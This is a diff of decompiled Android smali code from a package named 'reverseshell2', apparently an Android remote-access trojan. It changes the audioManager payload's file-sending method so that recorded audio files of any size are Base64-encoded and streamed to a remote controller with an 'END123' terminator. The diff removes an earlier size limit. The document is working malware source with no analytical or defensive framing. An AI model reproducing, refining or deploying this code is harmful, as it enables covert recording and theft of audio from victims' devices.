@@ -57,91 +57,49 @@
     .locals 7
     .param p0, "file"    # Ljava/io/File;
 
-    .line 104
-    invoke-virtual {p0}, Ljava/io/File;->length()J
+    .line 113
+    const-string v0, "UTF-8"
 
-    move-result-wide v0
-
-    const-string v2, "UTF-8"
-
-    const-wide/32 v3, 0xf42400
-
-    cmp-long v5, v0, v3
-
-    if-lez v5, :cond_0
-
-    .line 106
     :try_start_0
-    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;
+    sget-object v1, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;
 
-    const-string v1, "Large file cant transfer \nEND123\n"
+    const-string v2, "stopAudio\n"
 
-    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
+    invoke-virtual {v2, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
 
-    move-result-object v1
+    move-result-object v2
 
-    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V
+    invoke-virtual {v1, v2}, Ljava/io/OutputStream;->write([B)V
     :try_end_0
     .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
 
-    .line 109
+    .line 116
     goto :goto_0
 
-    .line 107
-    :catch_0
-    move-exception v0
-
-    .line 108
-    .local v0, "e":Ljava/io/IOException;
-    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
-
-    .line 110
-    .end local v0    # "e":Ljava/io/IOException;
-    :goto_0
-    return-void
-
-    .line 113
-    :cond_0
-    :try_start_1
-    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;
-
-    const-string v1, "stopAudio\n"
-
-    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
-
-    move-result-object v1
-
-    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V
-    :try_end_1
-    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1
-
-    .line 116
-    goto :goto_1
-
     .line 114
-    :catch_1
-    move-exception v0
+    :catch_0
+    move-exception v1
 
     .line 115
-    .restart local v0    # "e":Ljava/io/IOException;
-    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
+    .local v1, "e":Ljava/io/IOException;
+    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V
 
     .line 117
-    .end local v0    # "e":Ljava/io/IOException;
-    :goto_1
+    .end local v1    # "e":Ljava/io/IOException;
+    :goto_0
     invoke-virtual {p0}, Ljava/io/File;->length()J
 
-    move-result-wide v0
+    move-result-wide v1
 
-    long-to-int v1, v0
+    long-to-int v2, v1
 
     .line 118
-    .local v1, "size":I
-    new-array v0, v1, [B
+    .local v2, "size":I
+    new-array v1, v2, [B
 
     .line 120
-    .local v0, "data":[B
-    :try_start_2
+    .local v1, "data":[B
+    :try_start_1
     new-instance v3, Ljava/io/BufferedInputStream;
 
     new-instance v4, Ljava/io/FileInputStream;
@@ -152,14 +110,14 @@
 
     .line 121
     .local v3, "buf":Ljava/io/BufferedInputStream;
-    array-length v4, v0
+    array-length v4, v1
 
     const/4 v5, 0x0
 
-    invoke-virtual {v3, v0, v5, v4}, Ljava/io/BufferedInputStream;->read([BII)I
+    invoke-virtual {v3, v1, v5, v4}, Ljava/io/BufferedInputStream;->read([BII)I
 
     .line 123
-    invoke-static {v0, v5}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;
+    invoke-static {v1, v5}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;
 
     move-result-object v4
 
@@ -167,7 +125,7 @@
     .local v4, "encodedAudio":Ljava/lang/String;
     sget-object v5, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;
 
-    invoke-virtual {v4, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
+    invoke-virtual {v4, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
 
     move-result-object v6
 
@@ -178,30 +136,30 @@
 
     const-string v6, "END123\n"
 
-    invoke-virtual {v6, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
+    invoke-virtual {v6, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
 
-    move-result-object v2
+    move-result-object v0
 
-    invoke-virtual {v5, v2}, Ljava/io/OutputStream;->write([B)V
-    :try_end_2
-    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2
+    invoke-virtual {v5, v0}, Ljava/io/OutputStream;->write([B)V
+    :try_end_1
+    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
 
     .line 128
     .end local v3    # "buf":Ljava/io/BufferedInputStream;
     .end local v4    # "encodedAudio":Ljava/lang/String;
-    goto :goto_2
+    goto :goto_1
 
     .line 126
-    :catch_2
-    move-exception v2
+    :catch_1
+    move-exception v0
 
     .line 127
-    .local v2, "e":Ljava/lang/Exception;
-    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V
+    .local v0, "e":Ljava/lang/Exception;
+    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
 
     .line 129
-    .end local v2    # "e":Ljava/lang/Exception;
-    :goto_2
+    .end local v0    # "e":Ljava/lang/Exception;
+    :goto_1
     return-void
 .end method
 
